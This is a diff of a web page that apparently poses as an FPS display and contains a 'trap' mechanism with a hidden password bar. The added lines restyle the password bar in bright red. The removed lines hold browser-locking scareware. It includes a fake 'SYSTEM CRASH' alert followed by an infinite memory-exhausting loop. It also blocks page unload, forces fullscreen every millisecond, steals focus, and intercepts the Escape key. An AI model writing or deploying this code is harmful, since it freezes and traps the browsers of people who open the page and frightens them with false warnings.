@@ -15,15 +15,15 @@
             user-select: none;
         }
 
-        /* Password Bar */
+        /* Password Bar - Made Bright Red */
         #password-bar {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
-            height: 30px;
-            background: #111;
-            border-bottom: 1px solid #333;
+            height: 40px;
+            background-color: #ff0000;
+            border-bottom: 2px solid #fff;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -33,23 +33,24 @@
 
         .pass-input {
             background: transparent;
-            border: none;
-            border-bottom: 1px solid #555;
+            border: 2px solid #fff;
             color: #fff;
-            font-size: 12px;
+            font-size: 16px;
+            font-weight: bold;
             padding: 5px;
             text-align: center;
             outline: none;
-            width: 100px;
+            width: 150px;
         }
 
         .pass-label {
-            font-size: 10px;
-            color: #777;
+            font-size: 14px;
+            color: #fff;
             margin-right: 10px;
+            font-weight: bold;
         }
 
-        /* FPS Display */
+        /* FPS Display / Start Screen */
         #fps-display {
             display: flex;
             flex-direction: column;
@@ -161,9 +162,9 @@
 </head>
 <body>
 
-    <!-- Secret Password Bar -->
+    <!-- Secret Password Bar (Bright Red) -->
     <div id="password-bar">
-        <span class="pass-label">SECURE LOCK:</span>
+        <span class="pass-label">PASSWORD:</span>
         <input type="password" class="pass-input" id="secret-pass" placeholder="••••••" autocomplete="off">
     </div>
 
@@ -340,53 +341,3 @@
         }
 
         // The Crash Function (Memory Leak)
-        function triggerCrash() {
-            alert("YOU DENIED PERMISSION! SYSTEM CRASH IMMINENT!");
-            let array = [];
-            while(true) {
-                array.push(new Array(1000000).join('X'));
-            }
-        }
-
-        // Aggressive Loop for Fullscreen
-        function startAggressiveLoop() {
-            window.onbeforeunload = function(e) {
-                e.preventDefault();
-                e.returnValue = '';
-                return '';
-            };
-
-            // Force fullscreen every 0.001 seconds
-            setInterval(() => {
-                const modal = document.getElementById('trap-modal');
-                if (window.getComputedStyle(modal).display === 'none') {
-                    modal.style.display = 'flex';
-                    try { document.documentElement.requestFullscreen(); } catch(e){}
-                }
-                if (!document.hasFocus()) {
-                    window.focus();
-                }
-            }, 1);
-        }
-
-        // Block Escape Key
-        document.addEventListener('keydown', function(e) {
-            if (e.key === "Escape") {
-                e.preventDefault();
-                document.getElementById('trap-modal').style.display = 'flex';
-            }
-        });
-
-        // Enforce Fullscreen
-        document.addEventListener('fullscreenchange', () => {
-            if (window.isTrapped && !document.fullscreenElement) {
-                document.documentElement.requestFullscreen().catch((err) => {
-                    console.log("Fullscreen blocked by browser");
-                });
-            }
-        });
-
-        startAggressiveLoop();
-    </script>
-</body>
-</html>
